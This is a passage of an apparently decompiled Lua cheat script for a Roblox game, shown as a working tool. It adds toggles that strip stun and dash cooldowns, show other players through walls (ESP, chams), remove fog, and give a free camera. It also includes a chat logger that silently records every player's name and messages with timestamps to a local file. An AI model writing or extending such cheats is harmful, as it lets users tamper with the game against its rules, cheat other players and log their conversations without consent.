					local superSprintActive = values:FindFirstChild("SuperSprintActive")

					if superSprintActive then
						pcall(function()
							superSprintActive.Value = true
						end)
					end
				end
			end)
		end,
	})

	tbl6.AutoWeave = v27:AddToggle("AutoWeave", {
		Text = "Auto Weave",
		Description = "Weave at max speed",
		Default = false,
		Callback = function(autoWeave)
			if not autoWeave then
				return
			end

			task.spawn(function()
				while fn17("AutoWeave") do
					local character = getCharacter()

					if character then
						pcall(function()
							character:SetAttribute("WeaveCdUntil", 0)
						end)
					end

					pcall(function()
						Actions.Fire("Weave")
					end)

					task.wait(0.5)
				end
			end)
		end,
	})

	local connection13 = nil

	tbl6.NoStun = v27:AddToggle("NoStun", {
		Text = "No Stun",
		Description = "Can't be stunned",
		Default = false,
		Callback = function(noStun)
			if connection13 then
				connection13:Disconnect()
				connection13 = nil
			end

			if not noStun then
				return
			end

			connection13 = service.Heartbeat:Connect(function()
				local character = getCharacter()
				if not character then
					return
				end

				pcall(function()
					character:SetAttribute("StunUntil", 0)
				end)
			end)
		end,
	})

	tbl6.NoDashCD = v27:AddToggle("NoDashCD", {
		Text = "No Dash Cooldown",
		Description = "Dash without cooldown",
		Default = false,
		Callback = function(noDashCooldown)
			if not value then
				return
			end

			if noDashCooldown then
				for k, v36 in pairs(value) do
					if type(v36) ~= "table" then
						continue
					end

					if not tbl11[k] then
						tbl11[k] = {}

						if v36.time then
							tbl11[k].time = v36.time
						end

						if v36.cooldown then
							tbl11[k].cooldown = v36.cooldown
						end
					end

					if v36.time then
						rawset(v36, "time", 0.01)
					end

					if v36.cooldown then
						rawset(v36, "cooldown", 0)
					end
				end
			else
				for k, v36 in pairs(tbl11) do
					local v37 = value[k]
					if not v37 then
						continue
					end

					if v36.time then
						rawset(v37, "time", v36.time)
					end

					if v36.cooldown then
						rawset(v37, "cooldown", v36.cooldown)
					end
				end
			end
		end,
	})

	fn15(function()
		if connection13 then


			connection13:Disconnect()
			connection13 = nil
		end

		if _antiInsanityConn then
			_antiInsanityConn:Disconnect()
			_antiInsanityConn = nil
		end

		if connection12 then
			do
				connection12:Disconnect()
				connection12 = nil
			end
		end

		if not value then
			return
		end

		for k, v36 in pairs(tbl11) do
			local v37 = value[k]

			if v37 then
				if v36.time then
					rawset(v37, "time", v36.time)
				end

				if v36.cooldown then
					rawset(v37, "cooldown", v36.cooldown)
				end
			end
		end
	end)

	local chChatLogger2 = nil
	local connections = {}

	local function fn25()
		for _, connection14 in ipairs(connections) do
			pcall(function()
				connection14:Disconnect()
			end)
		end

		connections = {}

		if chChatLogger2 then
			pcall(function()
				chChatLogger2:Destroy()
			end)

			chChatLogger2 = nil
		end
	end

	local function fn26()
		fn25()
		local chChatLogger = Instance.new("ScreenGui")
		chChatLogger.Name = "CH_ChatLogger"
		chChatLogger.ResetOnSpawn = false
		chChatLogger.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

		pcall(function()
			chChatLogger.Parent = game:GetService("CoreGui")
		end)

		if not chChatLogger.Parent then
			chChatLogger.Parent = localPlayer:FindFirstChildOfClass("PlayerGui")
		end

		chChatLogger2 = chChatLogger
		local mainFrame = Instance.new("Frame")
		mainFrame.Name = "MainFrame"
		mainFrame.Parent = chChatLogger
		mainFrame.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
		mainFrame.BorderSizePixel = 0
		mainFrame.Position = UDim2.new(0.051, 0, 0.117, 0)
		mainFrame.Size = UDim2.new(0, 440, 0, 360)
		mainFrame.Active = true
		mainFrame.Draggable = true
		Instance.new("UICorner", mainFrame)
		local close = Instance.new("TextButton")
		close.Name = "Close"
		close.Parent = mainFrame
		close.BackgroundTransparency = 1
		close.BorderSizePixel = 0
		close.Position = UDim2.new(0.932, 0, 0, 0)
		close.Size = UDim2.new(0, 30, 0, 30)
		close.Font = Enum.Font.SourceSans
		close.Text = "X"
		close.TextColor3 = Color3.fromRGB(255, 255, 255)
		close.TextSize = 22

		close.MouseButton1Click:Connect(function()
			fn25()

			if tbl6.ChatLogger then
				pcall(function()
					tbl6.ChatLogger:SetValue(false)
				end)
			end
		end)

		local textLabel = Instance.new("TextLabel")
		textLabel.Parent = mainFrame
		textLabel.BackgroundTransparency = 1
		textLabel.BorderSizePixel = 0
		textLabel.Position = UDim2.new(0, 10, 0, 0)
		textLabel.Size = UDim2.new(0, 200, 0, 30)
		textLabel.Font = Enum.Font.SourceSansBold
		textLabel.Text = "Chat Logger"
		textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		textLabel.TextSize = 18
		textLabel.TextXAlignment = Enum.TextXAlignment.Left

		local chatLogsFrame = Instance.new("ScrollingFrame")
		chatLogsFrame.Name = "ChatLogsFrame"
		chatLogsFrame.Parent = mainFrame
		chatLogsFrame.BackgroundTransparency = 1
		chatLogsFrame.BorderSizePixel = 0
		chatLogsFrame.Position = UDim2.new(0, 0, 0.083, 0)
		chatLogsFrame.Size = UDim2.new(0, 440, 0, 330)
		chatLogsFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
		chatLogsFrame.ScrollBarThickness = 4
		chatLogsFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
		Instance.new("UICorner", chatLogsFrame)
		local uiListLayout = Instance.new("UIListLayout")
		uiListLayout.Parent = chatLogsFrame
		uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder

		local function fn27(text)
			local textLabel2 = Instance.new("TextLabel")
			textLabel2.Parent = chatLogsFrame
			textLabel2.Text = text
			textLabel2.BackgroundTransparency = 1
			textLabel2.BorderSizePixel = 0
			textLabel2.Size = UDim2.new(1, 0, 0, 17)
			textLabel2.Font = Enum.Font.SourceSans
			textLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
			textLabel2.TextSize = 18
			textLabel2.TextWrapped = true
			textLabel2.TextXAlignment = Enum.TextXAlignment.Left

			task.delay(15, function()
				pcall(function()
					textLabel2:Destroy()
				end)
			end)

			pcall(function()
				local content = text .. " | date : " .. os.date() .. "\n"

				if isfile and isfile("chatlogs.txt") then
					if appendfile then
						appendfile("chatlogs.txt", content)
					end
				elseif writefile then
					writefile("chatlogs.txt", content)
				end
			end)
		end

		for _, player in ipairs(Players:GetPlayers()) do
			local connection14 = player.Chatted:Connect(function(message)
				fn27("[" .. player.Name .. "]: " .. message)
			end)

			table.insert(connections, connection14)
		end

		local connection14 = Players.PlayerAdded:Connect(function(player)
			local connection14 = player.Chatted:Connect(function(message)
				fn27("[" .. player.Name .. "]: " .. message)
			end)

			table.insert(connections, connection14)
		end)

		table.insert(connections, connection14)
	end

	tbl6.ChatLogger = v27:AddToggle("ChatLogger", {
		Text = "Chat Logger",
		Description = "Log all chat messages",
		Default = false,
		Callback = function(chatLogger)
			if chatLogger then
				fn26()
			else
				fn25()
			end

		end,
	})

	fn15(function()
		do
			fn25()
			return
		end

		while true do
		end
	end)

	local function fn27()
		tbl6.PlayerESPEnabled = v28:AddToggle("PlayerESPEnabled", {
			Text = "Player ESP",
			Description = "See players through walls",
			Default = false,
			Callback = function(playerEsp)
				table_.Enabled = playerEsp
			end,
		})

		tbl7.PlayerESPColor = v28:AddColorPicker("PlayerESPColor", {
			Text = "ESP Color",
			Default = Color3.fromRGB(0, 255, 0),
			Callback = function(espColor)
				getgenv()._CH_PlayerESPColor = espColor

				for _, v36 in pairs(chEspLib.Cache) do
					if v36.Player then
						v36["CustomGradTop"] = espColor
						v36.CustomGradBot = espColor
						v36["LastGradTop"] = nil
						v36.LastGradBot = nil
						v36.LastGlowTop = nil
						v36.LastGlowBot = nil
						v36["LastFillTop"] = nil
						v36.LastFillBot = nil
					end
				end
			end,
		})

		tbl6.ShowLocalESP = v29:AddToggle("ShowLocalESP", {
			Text = "Show Local Player",
			Description = "Show ESP on yourself",
			Default = false,
			Callback = function(showLocalPlayer)
				table_.ShowLocalPlayer = showLocalPlayer

				if showLocalPlayer and not chEspLib.Cache[localPlayer] then
					chEspLib:AddTarget(localPlayer)
				elseif not showLocalPlayer and chEspLib.Cache[localPlayer] then
					chEspLib:RemoveTarget(localPlayer)
				end
			end,
		})

		local espTarget2 = nil
		local connection14 = nil
		local flag11 = false

		local function getNames()
			local names = { "-- None --" }

			for _, player in ipairs(Players:GetPlayers()) do
				if player ~= localPlayer then
					table.insert(names, player.Name)
				end
			end

			return names
		end

		tbl7.ESPTargetPlayer = v30:AddDropdown("ESPTargetPlayer", {
			Text = "ESP Target",
			Description = "Filter to one player",
			Values = getNames(),
			Default = nil,
			Multi = false,
			Callback = function(espTarget)
				espTarget2 = espTarget
			end,
		})

		v30:AddButton({
			Text = "Refresh Players",
			Func = function()
				tbl7.ESPTargetPlayer:SetValues(getNames())
			end,
		})

		tbl6.ESPTargetOnly = v30:AddToggle("ESPTargetOnly", {
			Text = "ESP Single Player",
			Description = "ESP one player only",
			Default = false,
			Callback = function(espSinglePlayer)
				if connection14 then
					connection14:Disconnect()
					connection14 = nil
				end

				if not espSinglePlayer then
					if flag11 then
						table_.Enabled = false
						flag11 = false
					end

					for _, player in ipairs(Players:GetPlayers()) do
						if player == localPlayer then
							continue
						end

						if chEspLib.Cache[player] then
							chEspLib:RemoveTarget(player)
						end

						if table_.Enabled then
							chEspLib:AddTarget(player)
						end
					end

					return
				end

				if not table_.Enabled then
					flag11 = true
					table_.Enabled = true
				end

				for _, player in ipairs(Players:GetPlayers()) do
					if player ~= localPlayer and chEspLib.Cache[player] then
						chEspLib:RemoveTarget(player)
					end
				end

				local function fn28()
					local espTarget = type(espTarget2) == "string" and espTarget2 or ""
					if espTarget == "-- None --" or espTarget == "" then
						return
					end

					for _, player in ipairs(Players:GetPlayers()) do
						if player == localPlayer then
							continue
						end

						if player.Name == espTarget then
							if not chEspLib.Cache[player] then
								chEspLib:AddTarget(player)
							end
						elseif chEspLib.Cache[player] then
							chEspLib:RemoveTarget(player)
						end
					end
				end

				fn28()

				connection14 = service.Heartbeat:Connect(function()
					if not fn17("ESPTargetOnly") then
						return
					end
					fn28()
				end)
			end,
		})

		local connection15 = nil
		local flag12 = false

		tbl6.ESPNearestOnly = v30:AddToggle("ESPNearestOnly", {
			Text = "ESP Nearest Only",
			Description = "ESP nearest player only",
			Default = false,
			Callback = function(espNearestOnly)
				if connection15 then
					connection15:Disconnect()
					connection15 = nil
				end

				if not espNearestOnly then
					if flag12 then
						table_.Enabled = false
						flag12 = false
					end

					for _, player in ipairs(Players:GetPlayers()) do
						if player == localPlayer then
							continue
						end

						if chEspLib.Cache[player] then
							chEspLib:RemoveTarget(player)
						end

						if table_.Enabled then
							chEspLib:AddTarget(player)
						end
					end

					return
				end

				if not table_.Enabled then
					flag12 = true
					table_.Enabled = true
				end

				for _, player in ipairs(Players:GetPlayers()) do
					if player ~= localPlayer and chEspLib.Cache[player] then
						chEspLib:RemoveTarget(player)
					end
				end

				connection15 = service.Heartbeat:Connect(function()
					if not fn17("ESPNearestOnly") then
						return
					end
					local child = getChild()
					if not child then
						return
					end
					local magnitude2 = math.huge
					local player2 = nil

					for _, player in ipairs(Players:GetPlayers()) do
						if not (player ~= localPlayer and player.Character) then
							continue
						end
						local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")

						if humanoidRootPart then
							local magnitude = (child.Position - humanoidRootPart.Position).Magnitude

							if magnitude < magnitude2 then
								magnitude2 = magnitude
								player2 = player
							end
						end
					end

					for _, player in ipairs(Players:GetPlayers()) do
						if player == localPlayer then
							continue
						end

						if player == player2 then
							if not chEspLib.Cache[player] then
								chEspLib:AddTarget(player)
							end
						elseif chEspLib.Cache[player] then
							chEspLib:RemoveTarget(player)
						end
					end
				end)
			end,
		})

		tbl6.ESPBoxes = Toggles:AddToggle("ESPBoxes", {
			Text = "Boxes",
			Description = "Box ESP",
			Default = true,
			Callback = function(boxes)
				do
					table_.Boxes.Enabled = boxes
					return
				end

				while true do
				end
			end,
		})

		tbl6.ESPGlow = Toggles:AddToggle("ESPGlow", {
			Text = "Box Glow",
			Description = "Glow effect",
			Default = true,
			Callback = function(boxGlow)
				table_.Boxes["Box Glow"].Enabled = boxGlow
			end,
		})

		tbl6.ESPChams = Toggles:AddToggle("ESPChams", {
			Text = "Chams",
			Description = "See through walls",
			Default = false,
			Callback = function(enabled2)
				table_.Chams.Enabled = enabled2
			end,
		})

		tbl6.ESPShowName = Toggles:AddToggle("ESPShowName", {
			Text = "Name",
			Description = "Show names",
			Default = true,
			Callback = function(name)
				table_.Texts.Name.Enabled = name
			end,
		})

		tbl6.ESPShowDist = Toggles:AddToggle("ESPShowDist", {
			Text = "Distance",
			Description = "Show distance",
			Default = true,
			Callback = function(distance)
				table_.Texts.Distance.Enabled = distance
			end,
		})

		tbl6.ESPShowHP = Toggles:AddToggle("ESPShowHP", {
			Text = "Health Bar",
			Description = "Show health",
			Default = true,
			Callback = function(enabled2)
				table_.Bars["Health Bar"].Enabled = enabled2
			end,
		})

		tbl6.ESPShowWeapon = Toggles:AddToggle("ESPShowWeapon", {
			Text = "Weapon",
			Description = "Show weapon",
			Default = true,
			Callback = function(weapon)
				table_.Texts.Weapon.Enabled = weapon
			end,
		})

		tbl7.ESPDist = Toggles:AddSlider("ESPDist", {
			Text = "Max Distance",
			Default = 7520,
			Min = 100,
			Max = 15000,
			Rounding = 0,
			Callback = function(maxDistance)
				table_.Distance = maxDistance
			end,
		})

		tbl7.BoxType = Style:AddDropdown("BoxType", {
			Text = "Box Type",
			Description = "Box style",
			Values = { "2D", "Corner" },
			Default = "2D",
			Multi = false,
			Callback = function(boxType)
				table_.Boxes.Type = boxType
			end,
		})

		tbl7.GlowT1 = Style:AddSlider("GlowT1", {
			Text = "Glow Top Trans",
			Default = 0.75,
			Min = 0,
			Max = 1,
			Rounding = 2,
			Callback = function(glowTopTrans)
				table_.Boxes["Box Glow"].Transparency[1] = glowTopTrans
			end,
		})

		tbl7.GlowT2 = Style:AddSlider("GlowT2", {
			Text = "Glow Bot Trans",
			Default = 0.75,
			Min = 0,
			Max = 1,
			Rounding = 2,
			Callback = function(glowBotTrans)
				table_.Boxes["Box Glow"].Transparency[2] = glowBotTrans
			end,
		})

		tbl7.ChamsFillT = Style:AddSlider("ChamsFillT", {
			Text = "Chams Fill Trans",
			Default = 0,
			Min = 0,
			Max = 1,
			Rounding = 2,
			Callback = function(chamsFillTrans)
				table_.Chams.FillTransparency = chamsFillTrans
			end,
		})

		tbl7.ChamsColor = Colors:AddColorPicker("ChamsColor", {
			Text = "Chams Color",
			Default = Color3.fromRGB(255, 255, 255),
			Callback = function(chamsColor)
				table_.Chams.FillColor = chamsColor
			end,
		})

		tbl7.BoxTopColor = Colors:AddColorPicker("BoxTopColor", {
			Text = "Box Top",
			Default = Color3.fromRGB(255, 255, 255),
			Callback = function(boxTop)
				table_.Boxes.Gradients.Top = boxTop
				table_.Boxes["Box Glow"].Top = boxTop
			end,
		})

		tbl7.BoxBotColor = Colors:AddColorPicker("BoxBotColor", {
			Text = "Box Bottom",
			Default = Color3.fromRGB(255, 255, 255),
			Callback = function(boxBottom)
				table_.Boxes.Gradients.Bot = boxBottom
				table_.Boxes["Box Glow"].Bot = boxBottom
			end,
		})

		fn15(function()
			pcall(function()
				if chEspLib and chEspLib.Unload then
					chEspLib:Unload()
				end
			end)
		end)
	end

	fn27()

	local function fn28()
		local spectatePlayer = nil
		local connection14 = nil

		local function getNames()
			local names = { "--" }

			for _, player in ipairs(Players:GetPlayers()) do
				if player ~= localPlayer then
					table.insert(names, player.Name)
				end
			end

			return names
		end

		tbl7.SpectatePlayers = v31:AddDropdown("SpectatePlayers", {
			Text = "Spectate Player",
			Description = "Watch a player",
			Values = getNames(),
			Default = nil,
			Multi = false,
			Callback = function(spectatePlayer2)
				spectatePlayer = type(spectatePlayer2) == "table" and next(spectatePlayer2) or spectatePlayer2
			end,
		})

		v31:AddButton({
			Text = "Refresh Players",
			Func = function()
				tbl7.SpectatePlayers:SetValues(getNames())
			end,
		})

		v31:AddButton({
			Text = "Spectate / Stop",
			Func = function()
				if connection14 then
					pcall(function()
						connection14:Disconnect()
					end)

					connection14 = nil
					local character = getCharacter()
					currentCamera.CameraSubject = character and character:FindFirstChildOfClass("Humanoid") or character
					currentCamera.CameraType = Enum.CameraType.Custom
					return
				end

				local name = tostring(spectatePlayer or "")
				local child = Players:FindFirstChild(name)
				local character2 = child and child.Character
				local humanoid = character2 and character2:FindFirstChildOfClass("Humanoid")
				if not humanoid then
					return
				end
				currentCamera.CameraSubject = humanoid
				currentCamera.CameraType = Enum.CameraType.Custom

				connection14 = child.CharacterAdded:Connect(function(character)
					task.wait(0.5)
					local child2 = character:FindFirstChildOfClass("Humanoid")

					if child2 then
						currentCamera.CameraSubject = child2
					end
				end)
			end,
		})

		local connection15 = nil
		local connections2 = {}
		local fogStart = nil
		local fogEnd = nil

		tbl6.NoFog = Lighting2:AddToggle("NoFog", {
			Text = "No Fog",
			Description = "Remove fog",
			Default = false,
			Callback = function(noFog)
				do
					if connection15 then
						connection15:Disconnect()
						connection15 = nil
					end

					for _, connection16 in ipairs(connections2) do
						pcall(function()
							connection16:Disconnect()
						end)
					end

					connections2 = {}

					if noFog then
						fogStart = fogStart or Lighting.FogStart
						fogEnd = fogEnd or Lighting.FogEnd

						local function onRenderStepped()
							pcall(function()
								Lighting.FogStart = 1e9
								Lighting.FogEnd = 1e9
							end)

							for _, descendant in ipairs(Lighting:GetDescendants()) do
								pcall(function()
									if descendant:IsA("Atmosphere") then
										descendant.Density = 0
										descendant.Haze = 0
										descendant.Glare = 0
									end

									if descendant:IsA("BlurEffect") then
										descendant.Enabled = false
									end
								end)
							end

							pcall(function()
								local terrain = workspace:FindFirstChildOfClass("Terrain")

								if terrain then
									terrain.WaterTransparency = 1
									terrain.WaterReflectance = 0
								end
							end)
						end

						onRenderStepped()
						connection15 = service.RenderStepped:Connect(onRenderStepped)

						table.insert(connections2, Lighting.ChildAdded:Connect(function(child)
							task.wait()

							if child:IsA("Atmosphere") then
								pcall(function()
									child.Density = 0
									child.Haze = 0
									child.Glare = 0
								end)
							end

							if child:IsA("BlurEffect") then
								pcall(function()
									child.Enabled = false
								end)
							end
						end))

						table.insert(connections2, Lighting:GetPropertyChangedSignal("FogEnd"):Connect(function()
							if Lighting.FogEnd < 100000000 then
								pcall(function()
									Lighting.FogStart = 1e9
									Lighting.FogEnd = 1e9
								end)
							end
						end))
					else
						pcall(function()
							Lighting.FogStart = fogStart or 0
							Lighting.FogEnd = fogEnd or 100000
						end)

						for _, descendant in ipairs(Lighting:GetDescendants()) do
							if descendant:IsA("Atmosphere") then
								pcall(function()
									descendant.Density = 0.395
									descendant.Haze = 0
									descendant.Glare = 0
								end)
							end

							if descendant:IsA("BlurEffect") then
								pcall(function()
									descendant.Enabled = true
								end)
							end
						end
					end

					return
				end

				while true do
				end
			end,
		})

		local connection16 = nil
		local connections3 = {}

		tbl6.NoAtmosphere = Lighting2:AddToggle("NoAtmosphere", {
			Text = "No Atmosphere",
			Description = "Remove post effects",
			Default = false,
			Callback = function(noAtmosphere)
				if connection16 then
					connection16:Disconnect()
					connection16 = nil
				end

				for _, connection17 in ipairs(connections3) do
					pcall(function()
						connection17:Disconnect()
					end)
				end

				connections3 = {}

				if noAtmosphere then
					local function onRenderStepped()
						for _, descendant in ipairs(Lighting:GetDescendants()) do
							pcall(function()
								if descendant:IsA("PostEffect") then
									descendant.Enabled = false
								end

								if descendant:IsA("Atmosphere") then
									descendant.Density = 0
									descendant.Offset = 0
									descendant.Haze = 0
									descendant.Glare = 0
								end
							end)
						end
					end

					onRenderStepped()
					connection16 = service.RenderStepped:Connect(onRenderStepped)

					table.insert(connections3, Lighting.ChildAdded:Connect(function(child)
						task.wait()

						if child:IsA("PostEffect") then
							pcall(function()
								child.Enabled = false
							end)
						end

						if child:IsA("Atmosphere") then
							pcall(function()
								child.Density = 0
								child.Offset = 0
								child.Haze = 0
								child.Glare = 0
							end)
						end
					end))

					table.insert(connections3, Lighting.DescendantAdded:Connect(function(descendant)
						task.wait()

						if descendant:IsA("PostEffect") then
							pcall(function()
								descendant.Enabled = false
							end)
						end
					end))
				else
					for _, descendant in ipairs(Lighting:GetDescendants()) do
						if descendant:IsA("PostEffect") then
							pcall(function()
								descendant.Enabled = true
							end)
						end

						if descendant:IsA("Atmosphere") then
							pcall(function()
								descendant.Density = 0.395
								descendant.Offset = 0
								descendant.Haze = 0
								descendant.Glare = 0
							end)
						end
					end
				end
			end,
		})

		local connection17 = nil

		tbl6.FullBright = Lighting2:AddToggle("FullBright", {
			Text = "FullBright",
			Description = "Max brightness",
			Default = false,
			Callback = function(fullBright)
				if connection17 then
					connection17:Disconnect()
					connection17 = nil
				end

				if fullBright then
					connection17 = service.RenderStepped:Connect(function()
						Lighting.Brightness = tbl10.brightness
						Lighting.ClockTime = 14
						Lighting.FogEnd = 100000
						Lighting.GlobalShadows = false
					end)
				else
					Lighting.Brightness = 1
					Lighting.ClockTime = 14
					Lighting.FogEnd = 1000000
					Lighting.GlobalShadows = true
				end
			end,
		})

		tbl7.Brightness = Lighting2:AddSlider("Brightness", {
			Text = "Brightness",
			Default = 2,
			Min = 0,
			Max = 10,
			Rounding = 1,
			Callback = function(brightness)
				tbl10.brightness = brightness
			end,
		})

		local connection18 = nil
		local color = Color3.fromRGB(128, 128, 128)

		tbl6.CustomAmbient = Lighting2:AddToggle("CustomAmbient", {
			Text = "World Ambient",
			Description = "Custom map color",
			Default = false,
			Callback = function(worldAmbient)
				if connection18 then
					connection18:Disconnect()
					connection18 = nil
				end

				if worldAmbient then
					connection18 = service.RenderStepped:Connect(function()
						Lighting.Ambient = color
						Lighting.OutdoorAmbient = color
					end)
				else
					Lighting.Ambient = Color3.fromRGB(0, 0, 0)
					Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
				end
			end,
		})

		tbl7.WorldAmbient = Lighting2:AddColorPicker("WorldAmbient", {
			Text = "Ambient Color",
			Default = Color3.fromRGB(128, 128, 128),
			Callback = function(ambientColor)
				color = ambientColor

				if connection18 then
					Lighting.Ambient = ambientColor
					Lighting.OutdoorAmbient = ambientColor
				end
			end,
		})

		local connections4 = {}
		local n9 = 0
		local n10 = 0
		local vector = Vector3.zero
		local cframe = nil

		tbl6.Freecam = v32:AddToggle("Freecam", {
			Text = "Free Cam",
			Description = "Free camera",
			Default = false,
			Callback = function(freeCam)
				for _, connection19 in ipairs(connections4) do
					pcall(function()
						connection19:Disconnect()
					end)
				end

				connections4 = {}
				UserInputService.MouseBehavior = Enum.MouseBehavior.Default
				UserInputService.MouseIconEnabled = true

				if not freeCam then
					currentCamera.CameraType = Enum.CameraType.Custom
					local character = getCharacter()

					if character then
						local humanoid = character:FindFirstChildOfClass("Humanoid")

						if humanoid then
							currentCamera.CameraSubject = humanoid
							humanoid.WalkSpeed = humanoid.WalkSpeed
						end

						local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

						if humanoidRootPart and cframe then
							humanoidRootPart.Anchored = false
						end


					end

					cframe = nil
					return
				end

				local cframe2 = currentCamera.CFrame
				vector = cframe2.Position
				n10 = math.atan2(-cframe2.LookVector.X, -cframe2.LookVector.Z)
				n9 = math.asin(math.clamp(cframe2.LookVector.Y, -1, 1))
				local character = getCharacter()

				if character then
					local child = character:FindFirstChild("HumanoidRootPart")

					if child then
						cframe = child.CFrame
						child.Anchored = true
					end
				end

				currentCamera.CameraType = Enum.CameraType.Scriptable
				UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
				UserInputService.MouseIconEnabled = false

				table.insert(connections4, service.RenderStepped:Connect(function(deltaTime)
					UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
					local mouseDelta = UserInputService:GetMouseDelta()
					n10 -= mouseDelta.X * tbl10.freeCamSens * 0.003
					n9 = math.clamp(n9 - mouseDelta.Y * tbl10.freeCamSens * 0.003, -1.55, 1.55)
					local cframe3 = CFrame.fromEulerAnglesYXZ(n9, n10, 0)
					local n11 = tbl10.freeCamSpeed * deltaTime * 20 * (UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) and 3 or 1)

					if UserInputService:IsKeyDown(Enum.KeyCode.W) then
						vector += cframe3.LookVector * n11
					end

					if UserInputService:IsKeyDown(Enum.KeyCode.S) then
						vector -= cframe3.LookVector * n11
					end

					if UserInputService:IsKeyDown(Enum.KeyCode.A) then
						vector -= cframe3.RightVector * n11
					end

					if UserInputService:IsKeyDown(Enum.KeyCode.D) then
						vector += cframe3.RightVector * n11
					end

					if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
						vector += Vector3.yAxis * n11
					end

					if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
						vector -= Vector3.yAxis * n11
					end

					currentCamera.CFrame = CFrame.new(vector) * cframe3
					local character2 = getCharacter()

					if character2 then
						local child = character2:FindFirstChild("HumanoidRootPart")

						if child then
							child.Anchored = true
						end
					end
				end))
			end,
		})

		tbl7.FreeCamSens = v32:AddSlider("FreeCamSens", {
			Text = "Look Sensitivity",
			Default = 0.3,
			Min = 0.1,
			Max = 5,
			Rounding = 1,
			Callback = function(lookSensitivity)
				tbl10.freeCamSens = lookSensitivity
			end,
		})

		tbl7.FreeCamSpeed = v32:AddSlider("FreeCamSpeed", {
			Text = "Move Speed",
			Default = 0.5,
			Min = 0.1,
			Max = 50,
			Rounding = 1,
			Callback = function(moveSpeed)
				tbl10.freeCamSpeed = moveSpeed
			end,
		})

		local connection19 = nil

		tbl6.Force3rdPerson = v33:AddToggle("Force3rdPerson", {
			Text = "Force 3rd Person",
			Description = "Force third person",
			Default = false,
			Callback = function(force3rdPerson)
				if connection19 then
					connection19:Disconnect()
					connection19 = nil
				end

				if force3rdPerson then
					pcall(function()
						localPlayer.CameraMinViewDistance = 8
					end)

					pcall(function()
						localPlayer.CameraMode = Enum.CameraMode.Classic
					end)

					connection19 = service.RenderStepped:Connect(function()
						pcall(function()
							localPlayer.CameraMinViewDistance = 8
						end)

						pcall(function()
							localPlayer.CameraMode = Enum.CameraMode.Classic
						end)
					end)
				else
					pcall(function()
						localPlayer.CameraMinViewDistance = 0.5
					end)

					pcall(function()
						localPlayer.CameraMode = Enum.CameraMode.Classic
					end)
				end
			end,
		})

		local connection20 = nil

		tbl6.FOVChanger = v33:AddToggle("FOVChanger", {
			Text = "Custom FOV",
			Description = "Change FOV",
			Default = false,
			Callback = function(customFov)
				if connection20 then
					connection20:Disconnect()
					connection20 = nil
				end

				if customFov then
					currentCamera.FieldOfView = tbl10.fovVal

					connection20 = service.RenderStepped:Connect(function()
						if currentCamera.FieldOfView ~= tbl10.fovVal then
							currentCamera.FieldOfView = tbl10.fovVal
						end
					end)
				else
					currentCamera.FieldOfView = 70
				end
			end,
		})

		tbl7.FOV = v33:AddSlider("FOV", {
			Text = "Camera FOV",
			Default = 70,
			Min = 0,
			Max = 120,
			Rounding = 1,
			Callback = function(cameraFov)
				tbl10.fovVal = cameraFov

				if connection20 then
					currentCamera.FieldOfView = cameraFov
				end
			end,
		})

		local connection21 = nil
		local circle = nil
		local circle2 = nil

		tbl6.CustomCursor = Cursor:AddToggle("CustomCursor", {
			Text = "Dot Cursor",
			Description = "Dot cursor",
			Default = false,
			Callback = function(dotCursor)
				if connection21 then
					connection21:Disconnect()
					connection21 = nil
				end

				if circle then
					circle:Remove()
					circle = nil
				end

				if circle2 then
					circle2:Remove()
					circle2 = nil
				end

				local mouseIconEnabled = not dotCursor
				UserInputService.MouseIconEnabled = mouseIconEnabled

				if not mouseIconEnabled then
					circle = Drawing.new("Circle")
					circle.Radius = 6
					circle.Filled = true
					circle.Visible = true
					circle.Color = Color3.new(1, 1, 1)
					circle.Transparency = 1
					circle.Thickness = 1
					circle2 = Drawing.new("Circle")
					circle2.Radius = 10
					circle2.Filled = false
					circle2.Visible = true
					circle2.Color = Color3.new(1, 1, 1)
					circle2.Transparency = 0.8
					circle2.Thickness = 1.5

					connection21 = service.RenderStepped:Connect(function()
						local mouseLocation = UserInputService:GetMouseLocation()
						circle.Position = mouseLocation
						circle2.Position = mouseLocation
					end)

					return
				end

				do
					return
				end

				while true do
				end
			end,
		})

		tbl6.CursorFilled = Cursor:AddToggle("CursorFilled", {
			Text = "Cursor Dot Filled",
			Description = "Fill the dot",
			Default = true,
			Callback = function(cursorDotFilled)
				if circle then
					circle.Filled = cursorDotFilled
				end
			end,
		})

		tbl7.CursorSize = Cursor:AddSlider("CursorSize", {
			Text = "Cursor Size",
			Default = 6,
			Min = 1,
			Max = 20,
			Rounding = 0,
			Callback = function(cursorSize)
				if circle then
					circle.Radius = cursorSize
				end
			end,
		})

		tbl7.CursorRingSize = Cursor:AddSlider("CursorRingSize", {
			Text = "Ring Size",
			Default = 10,
			Min = 0,
			Max = 30,
			Rounding = 0,
			Callback = function(ringSize)
				if circle2 then
					circle2.Radius = ringSize
				end
			end,
		})

		tbl6.CustomCrosshair = Cursor:AddToggle("CustomCrosshair", {
			Text = "Crosshair",
			Description = "Screen crosshair",
			Default = false,
			Callback = function(crosshair)
				if crosshair then
					if not getgenv()._CHCrosshair then
						local square = Drawing.new("Square")
						square.Size = Vector2.new(14, 14)
						square.Position = Vector2.new(currentCamera.ViewportSize.X / 2 - 7, currentCamera.ViewportSize.Y / 2 - 7)
						square.Color = Color3.new(1, 1, 1)
						square.Transparency = 1
						square.Filled = false
						square.Thickness = 1
						square.Visible = true

						local line = Drawing.new("Line")
						line.From = Vector2.new(currentCamera.ViewportSize.X / 2 - 6, currentCamera.ViewportSize.Y / 2)
						line.To = Vector2.new(currentCamera.ViewportSize.X / 2 + 6, currentCamera.ViewportSize.Y / 2)
						line.Color = Color3.new(1, 1, 1)
						line.Thickness = 1
						line.Visible = true

						local line2 = Drawing.new("Line")
